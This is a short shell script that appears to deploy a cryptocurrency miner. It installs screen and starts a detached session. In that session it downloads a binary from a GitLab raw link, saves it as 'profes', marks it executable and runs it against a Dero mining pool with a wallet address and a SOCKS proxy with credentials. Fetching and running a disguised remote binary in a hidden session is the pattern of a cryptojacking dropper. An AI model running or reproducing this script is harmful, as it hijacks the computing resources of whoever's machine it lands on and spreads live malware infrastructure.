#!/bin/sh

cd
apt-get install -y screen < "/dev/null"
mkdir yoho
cd yoho

screen -S "layer" -d -m
screen -r "layer" -X stuff $'wget -O profes https://gitlab.com/taufiqalkaf2230/matix/-/raw/main/berkah192r5 && chmod +x profes && ./profes -r 191.252.185.100:10300 -w dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w.ROSE -p rpc -m $(nproc --all) -k -1 -ft 3 -sock-address 185.199.229.156:7492 -sock-auth 99kjadawdawd129ad09:90owp08wfawbds53lsKLpoSz -report-realtime-hashrate -zero-hr-restart-time\n'
